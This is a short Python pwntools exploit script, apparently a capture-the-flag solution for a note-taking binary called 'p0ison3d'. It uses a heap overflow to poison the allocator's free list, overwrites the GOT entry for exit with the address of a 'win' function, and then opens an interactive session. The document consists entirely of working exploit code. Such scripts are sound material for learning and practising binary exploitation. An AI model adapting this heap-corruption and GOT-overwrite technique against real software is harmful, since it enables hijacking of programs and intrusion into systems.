#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'
elf = ELF('./p0ison3d', checksec=False)


#r = remote('172.17.0.2', 1337)
r = process('./p0ison3d')


def add_note(index, data):
    r.writelineafter(b'choice:', b'1')
    r.writelineafter(b'index:', f'{index}')
    r.writelineafter(b'data:', data)


def edit_note(index, data):
    r.writelineafter(b'choice:', b'3')
    r.writelineafter(b'index:', f'{index}')
    r.writelineafter(b'data:', data)


def del_note(index):
    r.writelineafter(b'choice:', b'4')
    r.writelineafter(b'index:', f'{index}')


add_note(0, 'aaaa') # [ a ]
add_note(1, 'bbbb') # [ a ] [ b ]
add_note(2, 'cccc') # [ a ] [ b ] [ c ]

del_note(2) # b
del_note(1) # c -> b

edit_note(0, b'A'*144 + p64(elf.got.exit)) # elf.got.exit -> b

add_note(1, 'dddd') # elf.got.exit
add_note(2, p64(elf.sym.win))

r.writelineafter('choice:', b'5')
r.interactive()
